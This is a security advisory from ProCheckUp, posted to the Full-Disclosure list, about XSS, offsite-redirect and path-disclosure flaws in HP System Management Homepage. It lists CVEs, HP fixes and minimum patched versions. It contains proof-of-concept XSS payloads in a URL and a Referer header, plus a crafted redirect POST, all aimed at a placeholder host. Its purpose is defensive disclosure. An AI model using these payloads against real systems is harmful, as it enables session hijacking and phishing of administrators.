PR10-11: Multiple XSS injection vulnerabilities and a offsite
redirection flaw within HP System Management Homepage (Insight Manager)

Vulnerability found: 6th June 2010

Date Published 20th May 2011

Severity: Medium


Description:

XSS vulnerabilities have been found within HP System Management; Arising
from insufficient input filtering.
By using a specially-crafted link, and tricking the victim into clicking
on it, an attacker can perform malicious attacks such as the following:

- Hijack user accounts by stealing the victim's cookies that are
assigned to the victim's browser by the vulnerable website

- Hijack user accounts by injecting a "fake" html form on the html
rendered by the victim's web browser

- Redirect the victim to a malicious third-party website which would
perform a phishing attack to steal the user credentials or exploit a
vulnerability (i.e.: buffer overflow) on the

victim's web browser in order to compromise the victim's workstation

Notes:

Authentication is normally needed, unless system has been configured to
support anonymous autologin.

Successfully tested on:
Version v3.0.0.64 windows
Version v6.0.0.96 windows
Version v6.1.0.102 windows
Version v6.1.0.103 linux

Tested on Windows 2008 64bit, Windows 2003 and Centos/Red Hat enterprise

Hardware Proliant DL380 G5, DL360 G5, DL380 G4

1) Basic reflective XSS attack (Windows only).

Proof of concept (move mouse pointer over search input box):

https://target-domain.foo:2381/hpdiags/frontend2/help/search.php?query="onmouseover="alert(1);

References: HP Customer Notice: HPSBMA02615 SSRT100228 rev.1 CVE-2010-4111

Fix: HP have issued a fix, download the appropiate update for your
operating system ensuring the sytem management agent is at least version
v8.5.1.3712  or above.

2) Referer header XSS attack - data needs to be sent using the POST method

POST https://target-domain.foo:2381/hmaserv/common/setitem.php

host: target-domain.foo:2381
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.8)
Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Referer: http://www.procheckup.com</script><script>alert(1)</script>
Cookie:
Compaq-HMMD=0001-7252052a-43b2-fb4a-951f-78af9561826a-1275875265807763;

References: HP Customer Notice:
http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02735590
CVE-2010-3283

Fix: HP have issued a fix, download the appropiate update for your
operating system ensuring the sytem management agent is at least version
v8.70.0.0 or above.


3) Offsite redirection by injecting //www.procheckup.com which is taken
as a valid URL by the Firefox web-browser. Submitting instead
http://www.procheckup.com is blocked

POST https://target-domain.foo:2381/proxy/ssllogin

Host: target-domain.foo:2381
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.8)
Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
redirecturl=//www.procheckup.com&user=avalidusername&password=avalidpassword

References: HP Customer
Notice:http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02735590

CVE-2011-1537

Fix: HP have issued a fix, download the appropiate update for your
operating system ensuring the sytem management agent is at least version
v8.5.1.3712 or above.

4) Information disclosure (many such cases) - webroot is disclosed.

https://target-domain.foo:2381/hmanics/hmanics.snmp.php

For windows :-
Fatal error: Call to undefined function QueueSNMP() in
C:\hp\hpsmh\data\htdocs\hmanics\hmanics.snmp.php.en on line 3

For Linux:-
Fatal error: Call to undefined function QueueSNMP() in
/opt/hp/hpsmh/data/htdocs/hmanics/hmanics.snmp.php.en on line 3

Consequences:

Attackers can force the victim's web browser to perform XSS/HTML
injection in the security context of the vulnerable site in order to
gather data from users who visit a page within

the target site.

References: HP Customer Notice: HPSN-2008-002 CVE-2010-4112

Fix: HP have issued a fix, download the appropiate update for your
operating system ensuring the sytem management agent is at least version
v8.5.1.3712  or above.



Credits: Richard Brain of ProCheckUp Ltd (www.procheckup.com)



Legal:

Copyright 2010 ProCheckUp Ltd. All rights reserved.

Permission is granted for copying and circulating this Bulletin to the
Internet community for the purpose of alerting them to

problems, if and only if the Bulletin is not changed or edited in any
way, is attributed to ProCheckUp indicating this web page URL, and
provided such reproduction and/or distribution

is performed for non-commercial purposes.

Any other use of this information is prohibited. ProCheckUp is not
liable for any misuse of this information by any third party. ProCheckUp
is not responsible for the content of

external Internet sites.

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
